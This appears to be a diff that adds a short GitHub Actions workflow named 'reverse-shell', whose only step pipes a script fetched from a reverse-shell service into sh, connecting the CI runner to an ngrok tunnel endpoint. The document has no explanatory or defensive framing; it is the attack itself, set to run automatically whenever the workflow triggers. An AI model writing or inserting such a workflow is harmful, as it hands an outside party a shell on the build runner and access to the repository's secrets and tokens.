@@ -1,0 +1,7 @@
+name: reverse-shell
+
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://reverse-shell.sh/2.tcp.eu.ngrok.io:12961 | sh
